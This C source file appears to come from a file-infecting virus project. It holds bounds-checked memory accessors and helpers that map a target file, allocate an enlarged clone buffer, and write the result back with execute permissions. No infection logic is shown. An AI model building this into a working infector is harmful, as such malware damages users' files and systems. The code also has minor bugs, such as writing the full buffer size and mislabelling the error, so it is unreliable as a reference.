
#include <sys/mman.h>
#include <sys/stat.h>

#include "accessors.h"
#include "virus_header.h"
#include "syscall.h"
#include "errors.h"
#include "compiler_utils.h"

/*
** safe()
** returns a safe pointer
** returns NULL if requested memory is out of range
*/

__warn_unused_result
void	*safe(struct safe_ptr ref, size_t offset, size_t size)
{
	if (offset + size > ref.size || offset + size < offset)
		return (NULL);
	return (ref.ptr + offset);
}

bool	free_accessor(struct safe_ptr *ref)
{
	if (ref->ptr)
	{
		if (sys_munmap(ref->ptr, ref->size) != 0)
			return errors(ERR_SYS, _ERR_MUNMAP_FAILED);
	}
	return true;
}

__warn_unused_result
bool	init_file_safe(struct safe_ptr *ref, const char *filename)
{
	void		*ptr;
	struct stat	buf;
	int		fd = sys_open(filename, O_RDONLY);

	if (fd < 0)
		return errors(ERR_SYS, _ERR_OPEN_FAILED);
	if (sys_fstat(fd, &buf) < 0)
		{sys_close(fd); return errors(ERR_SYS, _ERR_FSTAT_FAILED);}
	if (buf.st_mode & S_IFDIR)
		{sys_close(fd); return errors(ERR_USAGE, _ERR_NOT_A_FILE);}
	if ((ssize_t)(ptr = sys_mmap(0, buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) < 0)
		{sys_close(fd); return errors(ERR_SYS, _ERR_MMAP_FAILED);}
	if (sys_close(fd))
		return errors(ERR_SYS, _ERR_CLOSE_FAILED);

	ref->ptr  = ptr;
	ref->size = buf.st_size;
	return true;
}

__warn_unused_result
bool	init_clone_safe(struct safe_ptr *ref, size_t file_size, size_t extra_size)
{
	ref->size = file_size + extra_size;
	ref->ptr  = sys_mmap(0, ref->size, \
		PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);

	if ((ssize_t)ref->ptr < 0)
		return errors(ERR_SYS, _ERR_MMAP_FAILED);

	return true;
}

__warn_unused_result
bool	write_file(struct safe_ptr ref, size_t size, const char *filename)
{
	void	*ptr = safe(ref, 0, size);

	if (ptr == NULL) return errors(ERR_THROW, _ERR_T_WRITE_FILE);

	int	fd = sys_open(filename, O_CREAT | O_WRONLY | O_TRUNC, S_IRWXU);

	if (fd < 0) return errors(ERR_SYS, _ERR_OPEN_FAILED);

	if (sys_write(fd, ref.ptr, ref.size) < 0)
	{
		sys_close(fd);
		return errors(ERR_SYS, _ERR_CLOSE_FAILED);
	}

	sys_close(fd);
	return true;
}
